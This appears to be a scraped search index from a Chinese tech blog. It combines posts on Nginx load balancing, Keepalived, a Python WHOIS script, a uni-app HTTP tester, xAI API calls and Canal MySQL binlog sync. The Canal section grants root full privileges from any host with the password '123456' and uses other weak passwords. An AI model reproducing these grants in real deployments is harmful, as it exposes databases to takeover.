通过浏览器访问域名或服务器的公网IP地址，检查请求是否正确地被分发到两个后端服务器。\n7. 进一步配置（可选） 如果需要更复杂的负载均衡策略，可以在upstream块中添加更多选项。例如：\n轮询（默认）：每个请求按时间顺序逐一分配到不同的服务器，如果后端某个服务器宕机，能自动剔除。 最少连接：请求分配给连接数最少的服务器。 IP哈希：每个请求按访问客户端的IP哈希结果分配，这样来自同一客户端的请求会分配到同一台后端服务器。 示例配置：\nNginx upstream backend_servers { # 轮询（默认） server 192.168.1.100:8080; server 192.168.1.101:8081; # 最少连接 # least_conn; # IP哈希 # ip_hash; } 负载均衡策略及其配置方法： 1. 轮询（默认） 轮询是Nginx默认的负载均衡策略，每个请求按时间顺序逐一分配到不同的服务器。如果后端某个服务器宕机，Nginx会自动将其从轮询列表中剔除。\nupstream backend_servers { server 192.168.1.100:8080; server 192.168.1.101:8081; } 2. 最少连接 最少连接策略将请求分配给当前连接数最少的服务器，适用于处理长连接的场景。\nupstream backend_servers { least_conn; server 192.168.1.100:8080; server 192.168.1.101:8081; } 3. IP哈希 IP哈希策略根据客户端的IP地址进行哈希运算，确保来自同一客户端的请求总是被分配到同一台后端服务器。这在会话保持（Session Stickiness）场景中非常有用。\nupstream backend_servers { ip_hash; server 192.168.1.100:8080; server 192.168.1.101:8081; } 4. 加权轮询 加权轮询允许为每个后端服务器分配权重，权重越高，被分配到请求的概率越大。\nupstream backend_servers { server 192.168.1.100:8080 weight=3; server 192.168.1.101:8081 weight=1; } 5. 备用服务器 可以指定备用服务器，当主服务器不可用时，请求会被转发到备用服务器。\nupstream backend_servers { server 192.168.1.100:8080; server 192.168.1.101:8081 backup; } 6. 组合策略 也可以组合使用多种策略，例如同时使用IP哈希和加权轮询。\nupstream backend_servers { ip_hash; server 192.168.1.100:8080 weight=3; server 192.168.1.101:8081 weight=1; } 7. 测试和应用配置 完成配置后，测试Nginx配置文件是否正确无误：\nsudo nginx -t 如果测试成功，重新加载Nginx以使更改生效：\nsudo systemctl reload nginx 8. 验证配置 通过浏览器或其他工具访问域名或服务器的公网IP地址，检查请求是否按预期被分发到不同的后端服务器。 使用日志或后端服务器上的访问记录来验证负载均衡的效果。\n通过这些配置，可以实现更灵活和强大的负载均衡策略，以满足不同业务场景的需求。\n完整的Nginx配置示例 完整的Nginx配置示例，其中包含两台主用服务器和一台备用服务器。 这个配置将使用轮询策略，并且备用服务器将在主用服务器不可用时接管请求。\n# /etc/nginx/sites-available/default # 定义上游服务器组 upstream backend_servers { # 主用服务器 server 192.168.1.100:8080; server 192.168.1.101:8081; # 备用服务器 server 192.168.1.102:8082 backup; } # 定义服务器块 server { listen 80; server_name your_domain_or_ip; # 定义location块 location / { proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } # 可选：定义错误页面 error_page 404 /404.html; location = /404.html { internal; } error_page 500 502 503 504 /50x.html; location = /50x.html { internal; } } upstream 块: server 192.168.1.100:8080; 和 server 192.168.1.101:8081; 是两台主用服务器。 server 192.168.1.102:8082 backup; 是一台备用服务器，只有在主用服务器不可用时才会被使用。 server 块: listen 80; 指定了Nginx监听的端口号，这里是80端口。 server_name your_domain_or_ip; 应该替换为域名或服务器的公网IP地址。 location 块: proxy_pass http://backend_servers; 将请求代理到定义的上游服务器组。 proxy_set_header 指令用于设置转发给后端服务器的请求头信息。 错误页面: error_page 404 /404.html; 和 location = /404.html { internal; } 用于定义404错误页面。 error_page 500 502 503 504 /50x.html; 和 location = /50x.html { internal; } 用于定义500系列错误页面。\n日志: 查看Nginx的访问日志和错误日志，确保一切正常：\nBash sudo tail -f /var/log/nginx/access.log sudo tail -f /var/log/nginx/error.log 以实现两台主用服务器和一台备用服务器的负载均衡。\nNginx作为反向代理的作用 1. 安全性增强 ​​隐藏内部端口​​：Nginx可以隐藏Nextcloud实际运行的8080端口，对外只暴露标准的80(HTTP)或443(HTTPS)端口 ​​SSL/TLS终止​​：Nginx可以集中处理HTTPS加密，减轻应用容器的负担 ​​防止直接暴露​​：Docker容器不直接暴露在公网上，降低了攻击面\n2. 性能优化 ​​负载均衡​​：如果需要，可以轻松扩展为多容器架构，Nginx作为负载均衡器 ​​缓存静态内容​​：Nginx可以缓存静态文件(如图片、CSS、JS)，减轻应用服务器负担 ​​Gzip压缩​​：Nginx可以压缩传输内容，减少带宽使用\n3. 功能扩展 ​​统一入口点​​：如果你有多个服务(如Nextcloud、其他web应用)，Nginx可以作为统一入口，根据域名或路径路由到不同服务 ​​URL重写​​：可以自定义更友好的URL结构 ​​访问控制​​：可以在Nginx层面实现IP限制、速率限制等\n4. 运维便利 ​​日志集中​​：所有访问日志集中在Nginx，便于分析 ​​维护模式​​：可以在Nginx层面实现维护页面，而不需要修改Nextcloud ​​HTTP/2支持​​：Nginx可以轻松启用HTTP/2协议，提升性能\n5. 标准化端口 使用标准HTTP(80)和HTTPS(443)端口，而不是非常规端口(如8080)，更符合用户预期 避免某些网络环境对非标准端口的限制\n6. 证书管理 集中管理SSL证书(特别是使用Let\u0026rsquo;s Encrypt自动续期时) 只需在Nginx配置证书，而不需要每个应用单独配置\n","permalink":"https://qfsyso.github.io/posts/nginx-keepalived/","summary":"Keepalived 是一种用于实现高可用性的工具，它通过VRRP（虚拟路由冗余协议）来管理虚拟IP地址，从而确保在主服务器故障时，备用服务器能够接管服务。\n环境准备 假设有两台Debian服务器：\nServer 1 (Master): IP地址 192.168.1.100 Server 2 (Backup): IP地址 192.168.1.101 虚拟IP地址: 192.168.1.102\n步骤一：安装Nginx 在两台服务器上安装Nginx。\nServer 1 (Master)\nsudo apt update sudo apt install nginx Server 2 (Backup)\nsudo apt update sudo apt install nginx 步骤二：安装Keepalived 在两台服务器上安装Keepalived。\nServer 1 (Master)\nsudo apt install keepalived Server 2 (Backup) ```Bash sudo apt install keepalived 步骤三：配置Keepalived 编辑Keepalived的配置文件 /etc/keepalived/keepalived.conf。\nServer 1 (Master)\nsudo nano /etc/keepalived/keepalived.conf 添加以下配置：\nvrrp_instance VI_1 { state MASTER interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.","title":" nginx keepalived"},{"content":"pip install python-whois import whois # 读取文件中的域名 def read_domains_from_file(file_path): with open(file_path, \u0026#39;r\u0026#39;) as file: domains = [line.strip() for line in file if line.strip()] return domains # 查询域名的WHOIS信息 def query_whois(domain): try: domain_info = whois.whois(domain) if domain_info.domain_name: return domain_info else: return None except Exception as e: print(f\u0026#34;Error querying WHOIS for {domain}: {e}\u0026#34;) return None # 保存查询结果到文件 def save_results_to_file(domains, results, output_file): with open(output_file, \u0026#39;w\u0026#39;) as file: for domain, result in results.items(): if result: file.write(f\u0026#34;Domain: {domain}\\n\u0026#34;) file.write(\u0026#34;WHOIS Information:\\n\u0026#34;) for key, value in result.items(): if isinstance(value, list): for item in value: file.write(f\u0026#34;{key}: {item}\\n\u0026#34;) else: file.write(f\u0026#34;{key}: {value}\\n\u0026#34;) file.write(\u0026#34;\\n\u0026#34;) else: file.write(f\u0026#34;Domain: {domain} - Not Registered\\n\\n\u0026#34;) # 主函数 def main(): file_path = \u0026#39;12.txt\u0026#39; # 文件路径 output_file = \u0026#39;whois_results2.txt\u0026#39; # 输出文件路径 domains = read_domains_from_file(file_path) results = {} for domain in domains: domain_info = query_whois(domain) results[domain] = domain_info save_results_to_file(domains, results, output_file) print(f\u0026#34;WHOIS results have been saved to {output_file}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"https://qfsyso.github.io/posts/python-whoisdomain/","summary":"pip install python-whois import whois # 读取文件中的域名 def read_domains_from_file(file_path): with open(file_path, \u0026#39;r\u0026#39;) as file: domains = [line.strip() for line in file if line.strip()] return domains # 查询域名的WHOIS信息 def query_whois(domain): try: domain_info = whois.whois(domain) if domain_info.domain_name: return domain_info else: return None except Exception as e: print(f\u0026#34;Error querying WHOIS for {domain}: {e}\u0026#34;) return None # 保存查询结果到文件 def save_results_to_file(domains, results, output_file): with open(output_file, \u0026#39;w\u0026#39;) as file: for domain, result in results.items(): if result: file.","title":"python whoisdomain"},{"content":"基础页面 \u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;url\u0026#34; placeholder=\u0026#34;请输入请求地址\u0026#34; /\u0026gt; \u0026lt;picker :range=\u0026#34;methods\u0026#34; @change=\u0026#34;onMethodChange\u0026#34;\u0026gt; \u0026lt;view\u0026gt;{{ methods[selectedIndex] }}\u0026lt;/view\u0026gt; \u0026lt;/picker\u0026gt; \u0026lt;textarea v-model=\u0026#34;body\u0026#34; placeholder=\u0026#34;请输入请求体\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button @click=\u0026#34;sendRequest\u0026#34;\u0026gt;发送请求\u0026lt;/button\u0026gt; \u0026lt;view v-if=\u0026#34;response\u0026#34; class=\u0026#34;response\u0026#34;\u0026gt; \u0026lt;text\u0026gt;响应:\u0026lt;/text\u0026gt; \u0026lt;pre\u0026gt;{{ response }}\u0026lt;/pre\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { url: \u0026#39;\u0026#39;, body: \u0026#39;\u0026#39;, response: \u0026#39;\u0026#39;, methods: [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;], selectedIndex: 0 }; }, methods: { onMethodChange(e) { this.selectedIndex = e.detail.value; }, sendRequest() { const method = this.methods[this.selectedIndex]; const data = method === \u0026#39;POST\u0026#39; ? JSON.parse(this.body) : null; uni.request({ url: this.url, method: method, data: data, success: (res) =\u0026gt; { this.response = JSON.stringify(res.data, null, 2); }, fail: (err) =\u0026gt; { this.response = JSON.stringify(err, null, 2); } }); } } }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .content { padding: 20px; } input, textarea, button { width: 100%; margin-bottom: 10px; } .response { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; } \u0026lt;/style\u0026gt; 添加 methods delete put，添加header ，给出修改后的代码 \u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;url\u0026#34; placeholder=\u0026#34;请输入请求地址\u0026#34; /\u0026gt; \u0026lt;picker :range=\u0026#34;methods\u0026#34; @change=\u0026#34;onMethodChange\u0026#34;\u0026gt; \u0026lt;view\u0026gt;{{ methods[selectedIndex] }}\u0026lt;/view\u0026gt; \u0026lt;/picker\u0026gt; \u0026lt;textarea v-model=\u0026#34;body\u0026#34; placeholder=\u0026#34;请输入请求体\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input v-model=\u0026#34;headers.Authorization\u0026#34; placeholder=\u0026#34;请输入Authorization头\u0026#34; /\u0026gt; \u0026lt;input v-model=\u0026#34;headers[\u0026#39;Content-Type\u0026#39;]\u0026#34; placeholder=\u0026#34;请输入Content-Type头\u0026#34; /\u0026gt; \u0026lt;button @click=\u0026#34;sendRequest\u0026#34;\u0026gt;发送请求\u0026lt;/button\u0026gt; \u0026lt;view v-if=\u0026#34;response\u0026#34; class=\u0026#34;response\u0026#34;\u0026gt; \u0026lt;text\u0026gt;响应:\u0026lt;/text\u0026gt; \u0026lt;pre\u0026gt;{{ response }}\u0026lt;/pre\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { url: \u0026#39;\u0026#39;, body: \u0026#39;\u0026#39;, response: \u0026#39;\u0026#39;, methods: [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;, \u0026#39;PUT\u0026#39;, \u0026#39;DELETE\u0026#39;], selectedIndex: 0, headers: { Authorization: \u0026#39;\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } }; }, methods: { onMethodChange(e) { this.selectedIndex = e.detail.value; }, sendRequest() { const method = this.methods[this.selectedIndex]; const data = method !== \u0026#39;GET\u0026#39; ? JSON.parse(this.body) : null; uni.request({ url: this.url, method: method, data: data, header: this.headers, success: (res) =\u0026gt; { this.response = JSON.stringify(res.data, null, 2); }, fail: (err) =\u0026gt; { this.response = JSON.stringify(err, null, 2); } }); } } }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .content { padding: 20px; } input, textarea, button { width: 100%; margin-bottom: 10px; } .response { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; } \u0026lt;/style\u0026gt; url：用户输入的请求地址。 body：用户输入的请求体。 response：服务器返回的响应内容。 methods：支持的HTTP方法数组。 selectedIndex：当前选中的HTTP方法索引。 headers：请求头对象，包含Authorization和Content-Type。 onMethodChange(e)：当用户选择不同的HTTP方法时，更新selectedIndex。 sendRequest()：发送HTTP请求。根据选中的HTTP方法和请求体，调用uni.request发送请求，并处理成功和失败的回调。\n添加了两个输入框，分别用于设置Authorization和Content-Type请求头。 在uni.request中，通过header属性传递请求头。\n动态请求头 \u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;url\u0026#34; placeholder=\u0026#34;请输入请求地址\u0026#34; /\u0026gt; \u0026lt;picker :range=\u0026#34;methods\u0026#34; @change=\u0026#34;onMethodChange\u0026#34;\u0026gt; \u0026lt;view\u0026gt;{{ methods[selectedIndex] }}\u0026lt;/view\u0026gt; \u0026lt;/picker\u0026gt; \u0026lt;textarea v-model=\u0026#34;body\u0026#34; placeholder=\u0026#34;请输入请求体\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;!-- 动态请求头输入框 --\u0026gt; \u0026lt;view v-for=\u0026#34;(header, index) in headers\u0026#34; :key=\u0026#34;index\u0026#34; class=\u0026#34;header-input\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;header.key\u0026#34; placeholder=\u0026#34;键\u0026#34; /\u0026gt; \u0026lt;input v-model=\u0026#34;header.value\u0026#34; placeholder=\u0026#34;值\u0026#34; /\u0026gt; \u0026lt;button @click=\u0026#34;removeHeader(index)\u0026#34;\u0026gt;删除\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;button @click=\u0026#34;addHeader\u0026#34;\u0026gt;添加请求头\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;sendRequest\u0026#34;\u0026gt;发送请求\u0026lt;/button\u0026gt; \u0026lt;view v-if=\u0026#34;response\u0026#34; class=\u0026#34;response\u0026#34;\u0026gt; \u0026lt;text\u0026gt;响应:\u0026lt;/text\u0026gt; \u0026lt;pre\u0026gt;{{ response }}\u0026lt;/pre\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { url: \u0026#39;\u0026#39;, body: \u0026#39;\u0026#39;, response: \u0026#39;\u0026#39;, methods: [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;, \u0026#39;PUT\u0026#39;, \u0026#39;DELETE\u0026#39;], selectedIndex: 0, headers: [ { key: \u0026#39;Authorization\u0026#39;, value: \u0026#39;\u0026#39; }, { key: \u0026#39;Content-Type\u0026#39;, value: \u0026#39;application/json\u0026#39; } ] }; }, methods: { onMethodChange(e) { this.selectedIndex = e.detail.value; }, addHeader() { this.headers.push({ key: \u0026#39;\u0026#39;, value: \u0026#39;\u0026#39; }); }, removeHeader(index) { this.headers.splice(index, 1); }, sendRequest() { const method = this.methods[this.selectedIndex]; const data = method !== \u0026#39;GET\u0026#39; ? JSON.parse(this.body) : null; // 将headers对象转换为uni.request所需的格式 const requestHeaders = this.headers.reduce((acc, header) =\u0026gt; { if (header.key \u0026amp;\u0026amp; header.value) { acc[header.key] = header.value; } return acc; }, {}); uni.request({ url: this.url, method: method, data: data, header: requestHeaders, success: (res) =\u0026gt; { this.response = JSON.stringify(res.data, null, 2); }, fail: (err) =\u0026gt; { this.response = JSON.stringify(err, null, 2); } }); } } }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .content { padding: 20px; } input, textarea, button { width: 100%; margin-bottom: 10px; } .header-input { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; } .header-input input { width: 45%; } .header-input button { width: 10%; } .response { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; } 使用v-for指令遍历headers数组，为每个请求头生成一对输入框和一个删除按钮。 提供一个“添加请求头”按钮，允许用户动态添加新的请求头输入框。\n长按复制结果 \u0026lt;view v-if=\u0026#34;response\u0026#34; class=\u0026#34;response\u0026#34; @longpress=\u0026#34;copyResponse\u0026#34;\u0026gt; \u0026lt;text\u0026gt;响应:\u0026lt;/text\u0026gt; \u0026lt;pre\u0026gt;{{ response }}\u0026lt;/pre\u0026gt; \u0026lt;/view\u0026gt; copyResponse() { uni.setClipboardData({ data: this.response, success: () =\u0026gt; { uni.showToast({ title: \u0026#39;复制成功\u0026#39;, icon: \u0026#39;success\u0026#39; }); }, fail: () =\u0026gt; { uni.showToast({ title: \u0026#39;复制失败\u0026#39;, icon: \u0026#39;none\u0026#39; }); } }); } \u0026lt;style\u0026gt; .response { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; /* 使文本换行显示 */ } \u0026lt;/style\u0026gt; 。\n","permalink":"https://qfsyso.github.io/posts/uniapp-postman/","summary":"基础页面 \u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;input v-model=\u0026#34;url\u0026#34; placeholder=\u0026#34;请输入请求地址\u0026#34; /\u0026gt; \u0026lt;picker :range=\u0026#34;methods\u0026#34; @change=\u0026#34;onMethodChange\u0026#34;\u0026gt; \u0026lt;view\u0026gt;{{ methods[selectedIndex] }}\u0026lt;/view\u0026gt; \u0026lt;/picker\u0026gt; \u0026lt;textarea v-model=\u0026#34;body\u0026#34; placeholder=\u0026#34;请输入请求体\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button @click=\u0026#34;sendRequest\u0026#34;\u0026gt;发送请求\u0026lt;/button\u0026gt; \u0026lt;view v-if=\u0026#34;response\u0026#34; class=\u0026#34;response\u0026#34;\u0026gt; \u0026lt;text\u0026gt;响应:\u0026lt;/text\u0026gt; \u0026lt;pre\u0026gt;{{ response }}\u0026lt;/pre\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { url: \u0026#39;\u0026#39;, body: \u0026#39;\u0026#39;, response: \u0026#39;\u0026#39;, methods: [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;], selectedIndex: 0 }; }, methods: { onMethodChange(e) { this.selectedIndex = e.detail.value; }, sendRequest() { const method = this.methods[this.selectedIndex]; const data = method === \u0026#39;POST\u0026#39; ?","title":"uniapp postman"},{"content":"X.AI Reg\nCreate API key curl https://api.x.ai/v1/chat/completions -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;Authorization: Bearer xai-xxx\u0026#34; -d \u0026#39;{ \u0026#34;messages\u0026#34;: [ { \u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a test assistant.\u0026#34; }, { \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;what can u do?\u0026#34; } ], \u0026#34;model\u0026#34;: \u0026#34;grok-beta\u0026#34;, \u0026#34;stream\u0026#34;: false, \u0026#34;temperature\u0026#34;: 0 }\u0026#39; python import requests # API URL 和 API 密钥 API_URL = \u0026#34;https://api.x.ai/v1/chat/completions\u0026#34; API_KEY = \u0026#34;xai-bELnXX\u0026#34; # 替换为实际 API 密钥 # 请求头 headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Authorization\u0026#34;: f\u0026#34;Bearer {API_KEY}\u0026#34; } # 请求数据 data = { \u0026#34;messages\u0026#34;: [ { \u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a test assistant.\u0026#34; }, { \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;what can u do?\u0026#34; } ], \u0026#34;model\u0026#34;: \u0026#34;grok-beta\u0026#34;, \u0026#34;stream\u0026#34;: False, \u0026#34;temperature\u0026#34;: 0 } try: response = requests.post(API_URL, headers=headers, json=data) response.raise_for_status() # 确保状态码为 200 result = response.json() # 解析响应 # print(\u0026#34;API 响应：\u0026#34;, result) # 提取内容 if \u0026#39;choices\u0026#39; in result and result[\u0026#39;choices\u0026#39;]: content = result[\u0026#39;choices\u0026#39;][0][\u0026#39;message\u0026#39;][\u0026#39;content\u0026#39;] print(\u0026#34;XAI回答：\\n\u0026#34;) print(content) else: print(\u0026#34;XAI的回答。\u0026#34;) except requests.exceptions.HTTPError as e: print(\u0026#34;HTTP 错误：\u0026#34;, e) print(\u0026#34;响应内容：\u0026#34;, response.text) # 输出详细的错误信息 except requests.exceptions.RequestException as e: print(\u0026#34;请求失败：\u0026#34;, e) ","permalink":"https://qfsyso.github.io/posts/xai-grok/","summary":"X.AI Reg\nCreate API key curl https://api.x.ai/v1/chat/completions -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;Authorization: Bearer xai-xxx\u0026#34; -d \u0026#39;{ \u0026#34;messages\u0026#34;: [ { \u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a test assistant.\u0026#34; }, { \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;what can u do?\u0026#34; } ], \u0026#34;model\u0026#34;: \u0026#34;grok-beta\u0026#34;, \u0026#34;stream\u0026#34;: false, \u0026#34;temperature\u0026#34;: 0 }\u0026#39; python import requests # API URL 和 API 密钥 API_URL = \u0026#34;https://api.x.ai/v1/chat/completions\u0026#34; API_KEY = \u0026#34;xai-bELnXX\u0026#34; # 替换为实际 API 密钥 # 请求头 headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Authorization\u0026#34;: f\u0026#34;Bearer {API_KEY}\u0026#34; } # 请求数据 data = { \u0026#34;messages\u0026#34;: [ { \u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a test assistant.","title":" XAI Grok"},{"content":"Canal 是阿里巴巴开源的一个数据库binlog解析工具，它能够捕获并解析MySQL等数据库的增量数据变化（即binlog），然后将这些变化的数据以消息的形式发送给其他系统或服务，如Elasticsearch、HBase、Redis等。这样做的好处是可以实现数据的实时同步，保证不同存储系统之间的数据一致性。\nCanal的设计理念主要是基于数据库的增量订阅与消费模式，它通过模拟MySQL的slave来实现对MySQL主库binlog的监听，当主库有数据更新时，Canal能及时捕捉到这些变化，并将变化的数据按照一定的格式输出，供下游系统消费使用。\n使用Canal的主要优势包括： 实时性 Canal通过模仿MySQL的slave节点行为，向MySQL master节点发送dump协议请求，以获取binlog日志8。这种方法使得Canal能够以较低的延迟捕获到数据库的变化，从而实现实时的数据同步。对于需要保持数据最新性的应用场景，如搜索引擎的索引更新或缓存系统的数据刷新，这一特性尤为重要。\n解耦 Canal作为一个独立的服务，充当了数据库和数据消费者之间的中介角色。它不仅减少了直接连接数据库带来的性能压力，还避免了因数据库结构或数据模型变更导致的下游系统适配问题。这种解耦机制增强了系统的灵活性和可维护性，使得各个组件可以独立发展而不相互干扰18。\n灵活性 Canal支持多种数据输出格式，包括但不限于JSON、XML等，这使得它可以很容易地与其他数据处理工具和服务集成。此外，Canal还提供了对Kafka、RocketMQ等消息队列的支持，这意味着数据不仅可以被同步到不同的存储系统，还可以被发送到消息队列中，供更多的应用和服务消费14。\n除了上述提到的优点外，Canal还具备以下特点：\n**高性能：**经过优化的Canal能够在高并发环境下保持稳定的性能表现，适合大规模数据同步场景。 **低延迟：**通过高效的日志解析和数据传输机制，Canal能够确保数据从源头到目的地的传输延迟尽可能低。 **高可用性：**Canal支持集群部署，结合Zookeeper等协调服务，可以实现故障自动切换，保证服务的连续性和稳定性21。 **安全性：**Canal可以通过配置SSL/TLS加密通信，保护数据在传输过程中的安全18。\n应用场景 Canal的应用场景非常广泛，包括但不限于：\n**数据同步：**将MySQL数据库的数据同步到Elasticsearch、Redis等其他存储系统，用于构建搜索引擎、缓存层等18。 **数据备份：**定期或实时备份MySQL数据库的数据，用于灾难恢复或数据归档18。 **数据集成：**在微服务架构中，使用Canal将多个数据库中的数据进行集成，提供统一的数据视图18。 **数据监控：**通过监听数据库的变化，及时发现异常操作或潜在的安全风险18。 Canal是一个功能强大、灵活多变的数据同步工具，它在保证数据实时性和一致性的基础上，提供了丰富的特性和广泛的应用场景，是现代数据驱动应用的理想选择。\nCanal环境准备 设置MySQL远程访问\ngrant all privileges on *.* to \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;123456\u0026#39;; flush privileges; MySQL配置\nCanal的原理基于MySQL binlog技术，所以，要想使用Canal就要开启MySQL的binlog写入功能，建议配置binlog的模式为row。\n可以在MySQL命令行输入如下命令来查看binlog的模式。\nSHOW VARIABLES LIKE \u0026#39;binlog_format\u0026#39;; 如果MySQL中默认的binlog格式为STATEMENT，需要将STATEMENT修改为ROW。修改/etc/my.cnf文件。\n/etc/my.cnf 在[mysqld]下面新增如下三项配置。\nlog-bin=mysql-bin #开启MySQL二进制日志 binlog_format=ROW #将二进制日志的格式设置为ROW server_id=1 #server_id需要唯一，不能与Canal的slaveId重复 修改完my.cnf文件后，需要重启MySQL服务。\nservice mysqld restart 再次查看binlog模式。\nSHOW VARIABLES LIKE \u0026#39;binlog_format\u0026#39;; MySQL创建用户授权\nCanal的原理是模式自己为MySQL Slave，所以一定要设置MySQL Slave的相关权限。这里，需要创建一个主从同步的账户，并且赋予这个账户相关的权限。\nCREATE USER canal@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;canal\u0026#39;; GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO \u0026#39;canal\u0026#39;@\u0026#39;localhost\u0026#39;; FLUSH PRIVILEGES; 服务器信息 124.219.119.2xx 主库所在服务器\n192.168.80.203 canal数据同步所在服务器\n连接主库所在服务器 切换 root 账号 su root\n启动MySQL8.0数据库 systemctl start mysqld.service\n创建复制账号和密码 连接主库所在服务器，即：192.168.91.131，运行MySQL 8.0数据库，创建复制账号和密码，命令如下：\nmysql\u0026gt; CREATE USER canal IDENTIFIED BY \u0026#39;canal\u0026#39;; mysql\u0026gt; GRANT SELECT, SHOW VIEW, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO \u0026#39;canal\u0026#39;@\u0026#39;%\u0026#39;; mysql\u0026gt; FLUSH PRIVILEGES; canal数据同步服务器操作 创建canal文件夹 cd /usr/local mkdir canal cd canal mkdir canal-package canal-adapter canal-deployer 安装canal deployer和canal adapter cd canal-package wget https://github.com/alibaba/canal/releases/download/canal-1.1.8canal.deployer-1.1.8.tar.gz wget https://github.com/alibaba/canal/releases/download/canal-1.1.8/canal.adapter-1.1.8.tar.gz tar -zxvf canal.adapter.tar.gz -C /usr/local/canal/canal-adapter tar -zxvf canal.deployer.tar.gz -C /usr/local/canal/canal-deployer\ngithub: https://github.com/alibaba/canal/releases?page=1\n配置和启动canal-deployer 配置canal-deployer 由于此次同步为MySQL数据库间的数据同步，所以此处不需要修改 canal.properties 配置文件，只需修改 instance.properties 即可\ncd /usr/local/canal/canal-deployer/conf/example vi instance.properties # position info canal.instance.master.address= xxx # username/password canal.instance.dbUsername=root canal.instance.dbPassword=123123 # table regex canal.instance.filter.regex=.*\\\\..* 说明\ncanal.id：设置Canal实例的唯一ID，建议使用UUID。\ncanal.ip：设置Canal实例的IP地址。\ncanal.port：设置Canal实例的端口号。\ncanal.destinations：设置Canal实例要连接的目标数据库地址和端口号，格式为\u0026lt;协议：//用户名：密码@IP地址：端口号/数据库名。\ncanal.username：设置连接目标数据库的用户名。\ncanal.password：设置连接目标数据库的密码。\ncanal.driverClassName：设置连接目标数据库的驱动类名，例如oracle.jdbc.driver.OracleDriver。\ncanal.connectionCharset：设置连接目标数据库的字符集，例如UTF8。\n可能遇到的问题： canal-deployer启动之后，如果在 logs 文件夹下没有 example 文件，参考如下情况说明：\n查看 /usr/local/canal/canal-deployer/bin 文件夹下，是否存在以hs_err_pid开头的文件。 出现hs_err_pid开头的文件，主要原因有两个： 1\u0026gt; 服务器内存不足，导致服务启动失败，出现OOM问题，这时需要增加服务器内存 2\u0026gt; 服务器打开的线程数达到上限，这时需要修改线程上限，操作如下： vi /etc/security/limits.conf\n修改内容可参考下面配置：\nsoft nproc 102400 hard nofile 102400 上述配置参数说明： 第一列：linux系统用户名，*代表所有用户 第二列：软连接/硬连接 第三列：类型，nproc 进程的数量/nofile 文件打开数/core-core 文件大小 第四列：数量\nbin文件夹下不存在以hs_err_pid开头的文件，查看logs文件夹下的canal文件夹下的canal_stdout.log文件，命令如下： cat /usr/local/canal/canal-deployer/logs/canal/canal_stdout.log\n若出现如下报错信息：\nOpenJDK 64-Bit Server VM warning: Ignoring option PermSize; support was removed in 8.0 OpenJDK 64-Bit Server VM warning: Ignoring option MaxPermSize; support was removed in 8.0 OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future 